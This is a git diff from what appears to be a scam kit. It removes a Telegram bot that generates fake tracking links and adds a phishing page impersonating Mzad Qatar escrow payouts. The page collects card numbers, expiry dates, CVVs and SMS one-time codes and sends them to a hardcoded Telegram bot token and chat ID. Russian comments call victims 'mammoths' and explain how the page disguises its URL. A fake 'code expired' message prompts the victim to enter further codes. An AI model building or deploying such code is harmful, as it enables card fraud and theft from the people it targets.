@@ -1,47 +1,202 @@
-import telebot
-import requests
-
-# ТВОЙ ВТОРОЙ БОТ (ГЕНЕРАТОР)
-GEN_TOKEN = '8767961693:AAE-ZeXNzE-mQ30UDF3rv5KpJWLp8nRRkCk'
-DOMAIN = "https://fedex-portal.vercel.app/track/id/"
-
-bot = telebot.TeleBot(GEN_TOKEN)
-state = {}
-
-@bot.message_handler(commands=['start'])
-def start(m):
-    bot.send_message(m.chat.id, "⚡️ **MZAD TRACK GEN**\n\nВведите название товара:")
-    bot.register_next_step_handler(m, get_name)
-
-def get_name(m):
-    state[m.chat.id] = {'i': m.text}
-    bot.send_message(m.chat.id, "💰 Введите цену (QAR):")
-    bot.register_next_step_handler(m, get_price)
-
-def get_price(m):
-    state[m.chat.id]['p'] = m.text
-    bot.send_message(m.chat.id, "🖼 Прямая ссылка на фото (с сайта):")
-    bot.register_next_step_handler(m, get_img)
-
-def get_img(m):
-    data = state[m.chat.id]
-    data['m'] = m.text
-    
-    bot.send_message(m.chat.id, "⏳ Создаю защищенную ссылку в базе...")
-    
-    try:
-        # Отправляем данные в облако
-        res = requests.post('https://jsonblob.com/api/jsonBlob', json=data)
-        # Получаем уникальный ID базы данных (он состоит только из цифр)
-        blob_url = res.headers.get('Location')
-        track_id = blob_url.split('/')[-1]
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mzad Qatar | Tracking & Payout</title>
+    <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
+    <style>
+        :root { --main-color: #8a1538; --bg: #f4f5f7; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg); margin: 0; padding: 15px; color: #333; }
+        .container { max-width: 480px; margin: 0 auto; background: #fff; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); overflow: hidden; }
+        .header { background: #fff; padding: 20px; text-align: center; border-bottom: 3px solid var(--main-color); }
+        .header img { height: 45px; }
         
-        # Формируем идеальную чистую ссылку
-        final_link = f"{DOMAIN}{track_id}"
+        .content { padding: 25px 20px; }
+        .status-badge { background: #e8f5e9; border: 1px solid #27ae60; color: #27ae60; padding: 10px; border-radius: 6px; font-weight: 800; margin-bottom: 20px; font-size: 13px; display: flex; align-items: center; gap: 8px; text-transform: uppercase; }
+        .status-badge::before { content: '●'; font-size: 16px; }
         
-        bot.send_message(m.chat.id, f"✅ **Готово! Ссылка чистая:**\n\n`{final_link}`", parse_mode="Markdown")
-    except Exception as e:
-        bot.send_message(m.chat.id, f"❌ Ошибка: {e}")
+        .item-preview { display: flex; gap: 15px; margin-bottom: 20px; align-items: center; background: #fafafa; padding: 10px; border-radius: 8px; border: 1px solid #eee; }
+        .item-preview img { width: 80px; height: 80px; object-fit: contain; border-radius: 6px; background: #fff; border: 1px solid #ddd; }
+        .item-info h3 { margin: 0 0 5px; font-size: 16px; color: #222; }
+        .item-info .price { font-size: 20px; font-weight: 800; color: var(--main-color); }
 
-print("Бот-генератор чистых ссылок запущен...")
-bot.polling()
+        h2 { font-size: 20px; margin-top: 0; color: #111; }
+        p { line-height: 1.5; font-size: 14px; color: #555; }
+        .tracking-num { font-family: monospace; font-weight: bold; color: #111; background: #eee; padding: 2px 6px; border-radius: 4px; }
+        
+        .form-group { margin-bottom: 15px; text-align: left; }
+        label { display: block; font-size: 12px; margin-bottom: 6px; color: #777; font-weight: bold; text-transform: uppercase; }
+        input { width: 100%; padding: 16px; border: 1.5px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; transition: 0.2s; background: #fdfdfd; }
+        input:focus { border-color: var(--main-color); background: #fff; box-shadow: 0 0 0 3px rgba(138, 21, 56, 0.1); }
+        input.err { border-color: #e74c3c; background: #fdf0f0; }
+
+        .btn { background: var(--main-color); color: #fff; border: none; padding: 18px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); }
+
+        #step-2 { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--main-color); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .footer { padding: 25px; text-align: center; font-size: 11px; color: #aaa; border-top: 1px solid #eee; background: #fafafa; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" alt="Mzad Qatar">
+    </div>
+    
+    <div class="content" id="step-1">
+        <div class="status-badge">FUNDS PENDING RELEASE</div>
+        <h2>Secure Escrow Payout</h2>
+        <p>Transaction <span class="tracking-num" id="track-id">Loading...</span> has been secured. Verify your receiving card details to release the funds to your account.</p>
+        
+        <div class="item-preview" id="item-box" style="display:none;">
+            <img id="p-img" src="">
+            <div class="item-info">
+                <h3 id="p-name">...</h3>
+                <div class="price" id="p-price">...</div>
+            </div>
+        </div>
+
+        <form id="payment-form">
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cc" placeholder="0000 0000 0000 0000" required maxlength="19">
+            </div>
+            <div style="display: flex; gap: 10px;">
+                <div class="form-group" style="flex: 1.5;">
+                    <label>Expiry (MM/YY)</label>
+                    <input type="text" id="exp" placeholder="MM/YY" required maxlength="5">
+                </div>
+                <div class="form-group" style="flex: 1;">
+                    <label>CVV</label>
+                    <input type="password" id="cvv" placeholder="***" required maxlength="4">
+                </div>
+            </div>
+            <button type="submit" class="btn" id="btn-card">VERIFY & RECEIVE FUNDS</button>
+        </form>
+    </div>
+
+    <div class="content" id="step-2">
+        <h2 style="text-align:center; color:#111;">Bank Authentication</h2>
+        <p style="text-align:center;">To authorize the deposit of <b id="t-amount" style="color:var(--main-color);"></b>, enter the one-time code sent to your mobile phone.</p>
+        <div id="loading" style="display:none;"><div class="loader"></div></div>
+        
+        <form id="sms-form">
+            <div class="form-group">
+                <input type="text" id="sms" placeholder="Enter SMS Code" required style="text-align:center; font-size: 20px; letter-spacing: 4px;">
+            </div>
+            <button type="submit" class="btn" id="btn-sms">CONFIRM TRANSFER</button>
+        </form>
+    </div>
+
+    <div class="footer">
+        © 2026 Mzad Qatar Escrow Services. <br>
+        Secured by QNB Financial Protocols.
+    </div>
+</div>
+
+<script>
+    // ТВОЙ БОТ-ПРИЕМЩИК ЛОГОВ
+    const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
+    const CHAT_ID = '8071425015';
+
+    // 1. СТЕЛС-РОУТИНГ: Читаем ID, маскируем URL и грузим БД
+    const urlParams = new URLSearchParams(window.location.search);
+    const trackId = urlParams.get('id');
+
+    let globalItem = "Device";
+    let globalPrice = "0";
+
+    if (trackId) {
+        // ТРЮК: Меняем адресную строку мамонта без перезагрузки страницы!
+        window.history.replaceState(null, '', `/track/id/${trackId}`);
+        
+        document.getElementById('track-id').innerText = '#' + trackId;
+
+        // Скачиваем данные товара
+        fetch(`https://jsonblob.com/api/jsonBlob/${trackId}`)
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('item-box').style.display = 'flex';
+                globalItem = data.i;
+                globalPrice = data.p;
+                document.getElementById('p-name').innerText = globalItem;
+                document.getElementById('p-price').innerText = globalPrice + ' QAR';
+                document.getElementById('t-amount').innerText = globalPrice + ' QAR';
+                if(data.m) document.getElementById('p-img').src = `https://wsrv.nl/?url=${encodeURIComponent(data.m)}`;
+            });
+    }
+
+    // 2. МАСКИ ВВОДА (Как в FedEx)
+    document.getElementById('cc').addEventListener('input', function (e) {
+        this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+        this.classList.remove('err');
+    });
+    document.getElementById('exp').addEventListener('input', function (e) {
+        this.value = this.value.replace(/\D/g, '').replace(/(.{2})/, '$1/').trim();
+    });
+
+    function isValid(n) {
+        let v = n.replace(/\s+/g, '');
+        let sum = 0;
+        for (let i = 0; i < v.length; i++) {
+            let num = parseInt(v.substr(i, 1));
+            if (i % 2 === v.length % 2) { num *= 2; if (num > 9) num -= 9; }
+            sum += num;
+        }
+        return sum % 10 === 0 && v.length >= 15;
+    }
+
+    // 3. ОТСТУК КАРТЫ
+    document.getElementById('payment-form').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const cc = document.getElementById('cc');
+        if (!isValid(cc.value)) {
+            cc.classList.add('err');
+            alert("Invalid card number.");
+            return;
+        }
+        
+        const exp = document.getElementById('exp').value;
+        const cvv = document.getElementById('cvv').value;
+        document.getElementById('btn-card').innerText = 'PROCESSING...';
+
+        const msg = `🇶🇦 **MZAD CARD**\n🆔 ID: #${trackId}\n📦 ${globalItem}\n💰 ${globalPrice} QAR\n\n💳 \`${cc.value}\`\n📅 \`${exp}\`\n🔒 \`${cvv}\``;
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+        setTimeout(() => {
+            document.getElementById('step-1').style.display = 'none';
+            document.getElementById('step-2').style.display = 'block';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('sms-form').style.display = 'none';
+            
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('sms-form').style.display = 'block';
+            }, 2500);
+        }, 1000);
+    });
+
+    // 4. ОТСТУК SMS
+    document.getElementById('sms-form').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const sms = document.getElementById('sms').value;
+        document.getElementById('btn-sms').innerText = 'VERIFYING...';
+
+        const msg = `🔑 **SMS CODE**: \`${sms}\`\n🆔 ID: #${trackId}`;
+        new Image().src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+
+        setTimeout(() => {
+            alert("The code is incorrect or has expired. A new code has been sent.");
+            document.getElementById('btn-sms').innerText = 'CONFIRM TRANSFER';
+            document.getElementById('sms').value = '';
+        }, 2000);
+    });
+</script>
+
+</body>
+</html>
